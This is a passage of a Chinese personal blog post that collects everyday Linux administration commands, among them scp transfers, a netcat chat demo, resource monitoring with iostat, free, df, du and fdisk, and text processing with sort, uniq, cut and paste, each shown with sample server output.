+<h6 id="从远程服务器下载到本地服务器"><a href="#从远程服务器下载到本地服务器" class="headerlink" title="从远程服务器下载到本地服务器"></a>从远程服务器下载到本地服务器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">从远程下载到本地的scp命令与上面的命令雷同，只要将从本地上传到远程的命令后面2个参数互换顺序就行了。</span><br><span class="line">实例1：从远处下载文件到本地目录</span><br><span class="line">scp root@10.80.100.20:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/</span><br><span class="line">说明</span><br><span class="line">从10.80.100.20机器上的/opt/soft/的目录中下载nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中</span><br><span class="line"></span><br><span class="line">实例2：从远处下载目录到本地目录</span><br><span class="line">scp -r root@10.80.100.20:/opt/soft/mongodb /opt/soft/</span><br><span class="line">说明</span><br><span class="line">从10.80.100.20机器上的/opt/soft/中下载mongodb 目录到本地的/opt/soft/目录来。</span><br></pre></td></tr></table></figure>
+<p>参考：<br><a href="https://www.cnblogs.com/webnote/p/5877920.html" target="_blank" rel="noopener">https://www.cnblogs.com/webnote/p/5877920.html</a></p>
+<h4 id="nc-数据传输"><a href="#nc-数据传输" class="headerlink" title="nc - 数据传输"></a>nc - 数据传输</h4><p>聊天<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">看看8090端口是否在使用</span><br><span class="line">[work@vm ~]$ lsof -i:8090</span><br><span class="line"></span><br><span class="line">监听8090端口</span><br><span class="line">[work@vm ~]$ nc -l 8090</span><br><span class="line">ffff</span><br><span class="line">ggg</span><br><span class="line">wo shi ni de</span><br><span class="line"></span><br><span class="line">连接10.26.21.4机器的8090端口，注意</span><br><span class="line">[skyler@skyler ~]$ nc 10.26.21.4 8090</span><br><span class="line">ffff</span><br><span class="line">ggg</span><br><span class="line">wo shi ni de</span><br></pre></td></tr></table></figure></p>
+<h2 id="CPU、内存、硬盘的使用状态"><a href="#CPU、内存、硬盘的使用状态" class="headerlink" title="CPU、内存、硬盘的使用状态"></a>CPU、内存、硬盘的使用状态</h2><h3 id="cpu使用状态"><a href="#cpu使用状态" class="headerlink" title="cpu使用状态"></a>cpu使用状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">top：获取 CPU 和硬盘的使用状态，通常使用使用 top（htop 更佳）</span><br><span class="line">iostat：CPU利用情况报告</span><br><span class="line">mpstat：CPU实时监控工具</span><br></pre></td></tr></table></figure>
+<h4 id="‘iostat-c’-CPU利用情况报告"><a href="#‘iostat-c’-CPU利用情况报告" class="headerlink" title="‘iostat -c’ CPU利用情况报告"></a>‘iostat -c’ CPU利用情况报告</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iostat -c 1 10</span><br><span class="line">avg-cpu: %user %nice %sys %iowait %idle</span><br><span class="line">1.98 0.00 0.35 11.45 86.22</span><br><span class="line">avg-cpu: %user %nice %sys %iowait %idle</span><br><span class="line">1.62 0.00 0.25 34.46 63.67</span><br></pre></td></tr></table></figure>
+<h4 id="mpstat-Multiprocessor-Statistics"><a href="#mpstat-Multiprocessor-Statistics" class="headerlink" title="mpstat- Multiprocessor Statistics"></a>mpstat- Multiprocessor Statistics</h4><blockquote>
+<p>实时CPU监控工具</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iostat:设备、分片的输入输出统计数据</span><br><span class="line">iotop:监视磁盘I/O使用状况工具</span><br></pre></td></tr></table></figure>
+<h4 id="iostat-报告CPU统计数据和设备、分片的输入输出统计数据"><a href="#iostat-报告CPU统计数据和设备、分片的输入输出统计数据" class="headerlink" title="iostat - 报告CPU统计数据和设备、分片的输入输出统计数据"></a>iostat - 报告CPU统计数据和设备、分片的输入输出统计数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iostat主要用于监控系统设备的IO负载情况</span><br><span class="line">iostat -mxz 15 可以让你获悉 CPU 和每个硬盘分区的基本信息和性能表现</span><br></pre></td></tr></table></figure>
+<h4 id="iotop-–-simple-top-like-I-O-monitor"><a href="#iotop-–-simple-top-like-I-O-monitor" class="headerlink" title="iotop – simple top-like I/O monitor"></a>iotop – simple top-like I/O monitor</h4><blockquote>
+<p>iotop是一个用来监视磁盘I/O使用状况的 top 类工具，可监测到哪一个程序使用的磁盘IO的信息（requires 2.6.20 or later）</p>
+</blockquote>
+<h3 id="内存使用状态"><a href="#内存使用状态" class="headerlink" title="内存使用状态"></a>内存使用状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free：展示内存的已使用和空闲的数量数据</span><br><span class="line">vmstat：报告虚拟内存统计数据</span><br><span class="line">/proc/meminfo：包含了更多更原始的信息，只是看起来不太直观</span><br><span class="line">区别：free为你提供了概要信息，输出结果清晰；/proc/meminfo提供更多更原始的信息，是了解Linux系统内存使用状况的主要接口，我们最常用的”free”、”vmstat”等命令就是通过它获取数据的</span><br></pre></td></tr></table></figure>
+<h4 id="free-Display-amount-of-free-and-used-memory-in-the-system"><a href="#free-Display-amount-of-free-and-used-memory-in-the-system" class="headerlink" title="free - Display amount of free and used memory in the system"></a>free - Display amount of free and used memory in the system</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">free</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           1.8G        1.1G         88M        668K        581M        501M</span><br><span class="line">Swap:            0B          0B          0B</span><br><span class="line"></span><br><span class="line">cat /proc/meminfo</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# cat /proc/meminfo</span><br><span class="line">MemTotal:        1883492 kB</span><br><span class="line">MemFree:           91292 kB</span><br><span class="line">MemAvailable:     513480 kB</span><br><span class="line">Buffers:          105988 kB</span><br><span class="line">Cached:           425896 kB</span><br><span class="line">SwapCached:            0 kB</span><br><span class="line">Active:          1398952 kB</span><br><span class="line">Inactive:         287908 kB</span><br><span class="line">Active(anon):    1155456 kB</span><br><span class="line">Inactive(anon):      188 kB</span><br><span class="line">Active(file):     243496 kB</span><br><span class="line">Inactive(file):   287720 kB</span><br><span class="line">Unevictable:           0 kB</span><br><span class="line">Mlocked:               0 kB</span><br></pre></td></tr></table></figure>
+<h4 id="vmstat-Report-virtual-memory-statistics"><a href="#vmstat-Report-virtual-memory-statistics" class="headerlink" title="vmstat - Report virtual memory statistics"></a>vmstat - Report virtual memory statistics</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vmstat: 内存使用状态</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# vmstat</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 4  0      0  91008 106004 489120    0    0     3    11    1    0  2  1 98  0  0</span><br></pre></td></tr></table></figure>
+<h4 id="proc-meminfo"><a href="#proc-meminfo" class="headerlink" title="/proc/meminfo"></a>/proc/meminfo</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="硬-磁-盘使用状态"><a href="#硬-磁-盘使用状态" class="headerlink" title="硬(磁)盘使用状态"></a>硬(磁)盘使用状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">df：检查文件系统磁盘占用情况</span><br><span class="line">du：检查磁盘空间占用情况,计算每个文件的大小然后累加</span><br><span class="line">ncdu：是一个可以替代du命令的工具</span><br><span class="line">iostat：硬盘的输入输出使用状态</span><br><span class="line">fdisk：磁盘分区表数据，可以创建和维护分区表</span><br><span class="line"></span><br><span class="line">du与df的区别：</span><br><span class="line">du是通过搜索文件来计算每个文件的大小然后累加，du能看到的文件只是一些当前存在的，没有被删除的。他计算的大小就是当前他认为存在的所有文件大小的累加和。而df是检查文件系统的磁盘空间使用情况</span><br><span class="line"></span><br><span class="line">du与ncdu的区别：</span><br><span class="line">ncdu是一个可以替代du命令的工具，ncdu命令是对传统du命令功能上的增强.它比寻常的命令，如 du -sh *，更节省时间</span><br></pre></td></tr></table></figure>
+<h4 id="df-disk-free"><a href="#df-disk-free" class="headerlink" title="df - disk free"></a>df - disk free</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">df -h 查看各分区使用情况 </span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# df -h</span><br><span class="line">文件系统        容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/vda1        40G   19G   19G   51% /</span><br><span class="line">devtmpfs        911M     0  911M    0% /dev</span><br><span class="line">tmpfs           920M     0  920M    0% /dev/shm</span><br><span class="line">tmpfs           920M  668K  920M    1% /run</span><br><span class="line">tmpfs           920M     0  920M    0% /sys/fs/cgroup</span><br><span class="line">tmpfs           184M     0  184M    0% /run/user/0</span><br><span class="line">overlay          40G   19G   19G   51% /var/lib/docker/overlay2/85bcc5f201ed0fbf82697f11da0730fbb8543b0e6cc9707b43b331e6e02d4eb0/merged</span><br><span class="line">shm              64M     0   64M    0% /var/lib/docker/containers/10f26d49e94eb6042a25a7807f293a5b75abe75af571414c0ae6e878b0ccdf41/shm</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/23/linux常用命令草集/image-20191020231155867.png" alt="image-20191020231155867"></p>
+<h4 id="du-disk-usage"><a href="#du-disk-usage" class="headerlink" title="du - disk usage"></a>du - disk usage</h4><blockquote>
+<p>硬盘使用情况概述</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">查看root目录下的直接层级文件(夹)大小</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# du -sh *</span><br><span class="line">52K	hs_err_pid24203.log</span><br><span class="line">52K	hs_err_pid25726.log</span><br><span class="line">52K	hs_err_pid27481.log</span><br><span class="line">4.0K	log.stack</span><br><span class="line">2.2G	skyler_home</span><br><span class="line">4.0K	test2.sh</span><br><span class="line">4.0K	test.sh</span><br><span class="line">4.0K	wget-log</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# pwd</span><br><span class="line">/root</span><br><span class="line"></span><br><span class="line">查看root目录下的所有层级文件(夹)大小</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# du -h *</span><br><span class="line">略</span><br></pre></td></tr></table></figure>
+<h4 id="ncdu"><a href="#ncdu" class="headerlink" title="ncdu"></a>ncdu</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aliyun默认没有这个命令</span><br></pre></td></tr></table></figure>
+<h4 id="iostat：硬盘的输入输出使用状态"><a href="#iostat：硬盘的输入输出使用状态" class="headerlink" title="iostat：硬盘的输入输出使用状态"></a>iostat：硬盘的输入输出使用状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="fdisk：磁盘分区表数据"><a href="#fdisk：磁盘分区表数据" class="headerlink" title="fdisk：磁盘分区表数据"></a>fdisk：磁盘分区表数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">列出所有磁盘数据</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk  -l</span><br><span class="line"></span><br><span class="line">磁盘 /dev/vda：42.9 GB, 42949672960 字节，83886080 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0x0008d73a</span><br><span class="line"></span><br><span class="line">   设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/vda1   *        2048    83884031    41940992   83  Linux</span><br><span class="line"></span><br><span class="line">查看/dev/vda1磁盘数据，并可以修改</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk /dev/vda1</span><br><span class="line">欢迎使用 fdisk (util-linux 2.23.2)。</span><br><span class="line"></span><br><span class="line">更改将停留在内存中，直到您决定将更改写入磁盘。</span><br><span class="line">使用写入命令前请三思。</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table</span><br><span class="line">使用磁盘标识符 0xbc589282 创建新的 DOS 磁盘标签。</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：p</span><br><span class="line"></span><br><span class="line">磁盘 /dev/vda1：42.9 GB, 42947575808 字节，83881984 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0xbc589282</span><br><span class="line"></span><br><span class="line">     设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)：</span><br></pre></td></tr></table></figure>
+<h2 id="文本处理相关"><a href="#文本处理相关" class="headerlink" title="文本处理相关"></a>文本处理相关</h2><h3 id="排序与过滤"><a href="#排序与过滤" class="headerlink" title="排序与过滤"></a>排序与过滤</h3><h4 id="sort-排序"><a href="#sort-排序" class="headerlink" title="sort 排序"></a>sort 排序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sort</span><br><span class="line">-t 指定分隔符（通常与 -k 联用）</span><br><span class="line">-k 指定用于排序的列号</span><br><span class="line">-n 以数字进行排序</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh</span><br><span class="line">echo $# $0 $1</span><br><span class="line">aaa=111</span><br><span class="line">echoaaa=1</span><br><span class="line">echo aaa=31</span><br><span class="line">fff=3</span><br><span class="line">bbbf=50</span><br><span class="line">aaa=111</span><br><span class="line"></span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -n -t = -k 2 test.sh</span><br><span class="line">echo $# $0 $1</span><br><span class="line">echoaaa=1</span><br><span class="line">fff=3</span><br><span class="line">echo aaa=31</span><br><span class="line">bbbf=50</span><br><span class="line">aaa=111</span><br><span class="line">aaa=111</span><br></pre></td></tr></table></figure>
+<p>可以看到文本按数字大小排序输出。最后两行是重复的，过滤重复我们就需要<code>uniq</code>命令了</p>
+<h4 id="uniq-过滤"><a href="#uniq-过滤" class="headerlink" title="uniq 过滤"></a>uniq 过滤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">往往与sort一起使用，从名字可以看出来，取唯一的意思</span><br><span class="line">解决上文sort -n -t = -k 2 test.sh重复数据的问题，我们只需要这样做</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -t = -k 2 -n test.sh |uniq</span><br><span class="line">echo $# $0 $1</span><br><span class="line">echoaaa=1</span><br><span class="line">fff=3</span><br><span class="line">echo aaa=31</span><br><span class="line">bbbf=50</span><br><span class="line">aaa=111</span><br></pre></td></tr></table></figure>
+<h3 id="截取与连接"><a href="#截取与连接" class="headerlink" title="截取与连接"></a>截取与连接</h3><h4 id="cut-按列切分文本"><a href="#cut-按列切分文本" class="headerlink" title="cut 按列切分文本"></a>cut 按列切分文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-b 以字节为单位进行分割</span><br><span class="line">-c 以字符为单位进行分割</span><br><span class="line">-f 以字段为分隔单位，与-d一起使用，指定显示哪个区域</span><br><span class="line">-d 指定分隔符，默认制表符</span><br><span class="line"></span><br><span class="line">实例：获取test-project-web服务配置中第18列=右侧的信息</span><br><span class="line">全部信息为：</span><br><span class="line">[skyler@tt ~]$ ps -ef|grep test-project-web</span><br><span class="line">skyler     11021     1  3 10月09 ?      06:41:36 /usr/local/bin/java -server -Xmn1024m -Xms4096m -Xmx4096m -XX:PermSize=64M -XX:MaxPermSize=128M -XX:+PrintGCDetails -XX:+PrintGCDateStamps -Xloggc:/home/skyler/var/test-project/log/gc.log -Dlogging.path=/home/skyler/var/test-project/log -Dlogging.config.path=/data0/skyler/test-project/test-project/config/cp/ -Dlogging.config=/data0/skyler/test-project/test-project/config/cp/base-logback.xml -jar /data0/skyler/test-project/test-project/lib/test-project-web-1.1.0.jar --spring.profiles.active=dev --spring.config.location=classpath:/,/data0/skyler/test-project/test-project/system/ --spring.config.name=application</span><br><span class="line"></span><br><span class="line">[skyler@tt ~]$ ps -ef|grep test-project-web|awk &apos;&#123;print $18&#125;&apos;|cut -d = -f 2</span><br><span class="line">/home/skyler/var/test-project/log</span><br></pre></td></tr></table></figure>
+<h4 id="paste-按列拼接文本"><a href="#paste-按列拼接文本" class="headerlink" title="paste 按列拼接文本"></a>paste 按列拼接文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">可以将两个文件的内容拼接在一起</span><br><span class="line">实例：将test.sh与test2.sh拼接在一起</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# echo &quot;aa2&quot; &gt; test2.sh</span><br><span class="line"></span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh</span><br><span class="line">echo $# $0 $1</span><br><span class="line">aaa=111</span><br><span class="line">echoaaa=1</span><br><span class="line">echo aaa=31</span><br><span class="line">fff=3</span><br><span class="line">bbbf=50</span><br><span class="line">aaa=111</span><br><span class="line"></span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh</span><br><span class="line">echo $# $0 $1	aa2</span><br><span class="line">aaa=111</span><br><span class="line">echoaaa=1</span><br><span class="line">echo aaa=31</span><br><span class="line">fff=3</span><br><span class="line">bbbf=50</span><br><span class="line">aaa=111</span><br><span class="line"></span><br><span class="line">-d 按指定分隔符拼接</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh -d &apos;,&apos;</span><br><span class="line">echo $# $0 $1,aa2</span><br><span class="line">aaa=111,</span><br><span class="line">echoaaa=1,</span><br><span class="line">echo aaa=31,</span><br><span class="line">fff=3,</span><br><span class="line">bbbf=50,</span><br><span class="line">aaa=111,</span><br></pre></td></tr></table></figure>
+<h3 id="行列操作-重点"><a href="#行列操作-重点" class="headerlink" title="行列操作 - 重点"></a>行列操作 - 重点</h3><h4 id="awk-列操作"><a href="#awk-列操作" class="headerlink" title="awk - 列操作"></a>awk - 列操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk 和 sed</span><br></pre></td></tr></table></figure>
+<h4 id="sed-操作"><a href="#sed-操作" class="headerlink" title="sed - 操作"></a>sed - 操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="文件处理相关"><a href="#文件处理相关" class="headerlink" title="文件处理相关"></a>文件处理相关</h2><h3 id="文件内容比较"><a href="#文件内容比较" class="headerlink" title="文件内容比较"></a>文件内容比较</h3><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diff file1 file2 -y</span><br><span class="line"></span><br><span class="line">使用 diff -r tree1 tree2 | diffstat 查看变更的统计数据</span><br></pre></td></tr></table></figure>
+<h4 id="vimdiff-edit-two-three-or-four-versions-of-a-file-with-Vim-and-show-differences"><a href="#vimdiff-edit-two-three-or-four-versions-of-a-file-with-Vim-and-show-differences" class="headerlink" title="vimdiff - edit two, three or four versions of a file with Vim and show differences"></a>vimdiff - edit two, three or four versions of a file with Vim and show differences</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vimdiff 用于比对并编辑文件</span><br></pre></td></tr></table></figure>
+<h2 id="服务程序"><a href="#服务程序" class="headerlink" title="服务程序"></a>服务程序</h2><h3 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ab 工具（Apache 中自带）可以简单粗暴地检查 web 服务器的性能。对于更复杂的负载测试，使用 siege</span><br></pre></td></tr></table></figure>
+<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>Jps</p>
+<h3 id="程序试错检查"><a href="#程序试错检查" class="headerlink" title="程序试错检查"></a>程序试错检查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">了解 strace 和 ltrace。这俩工具在你的程序运行失败、挂起甚至崩溃，而你却不知道为什么或你想对性能有个总体的认识的时候是非常有用的。注意 profile 参数（-c）和附加到一个运行的进程参数 （-p）</span><br><span class="line"></span><br><span class="line">strace：调试系统调用</span><br><span class="line">strace 经常被认为是程序员的调试工具，但它的功用不仅仅用来调试。它可以截获和记录进程调用系统的情况。因而，它是一个实用的诊断、教学和调试工具。比如说，你可以使用strace来查出某个程序在启动时实际上使用哪个配置文件。</span><br><span class="line"></span><br><span class="line">不过strace的确有一个缺陷。它在检查某个进程时，该进程的性能会一落千丈。因而，只有在我已经有极其充分的理由认为某个程序引起问题的情况下，才使用strace</span><br></pre></td></tr></table></figure>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取java_server_name的第18列值，等号分隔。尤其适合java -jar多个参数的场景</span><br><span class="line">ps -ef|grep java_server_name|awk &apos;&#123;print $18&#125;&apos;|cut -d = -f 2</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/" title="linux常用命令草集" target="_blank" rel="external">https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/yaoyuanyy" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/meinv.jpeg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/yaoyuanyy" target="_blank"><span class="text-dark">skyler</span><small class="ml-1x">Web Developer</small></a></h3>
+        <div>java后端开发，to B业务，趋于蓝色的性格，喜欢篮球等</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom="">
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2019/10/23/服务可用性的思考/" title="服务可用性的思考"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2019/10/13/linux中$符号的用法草集/" title="linux中$符号的用法草集"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
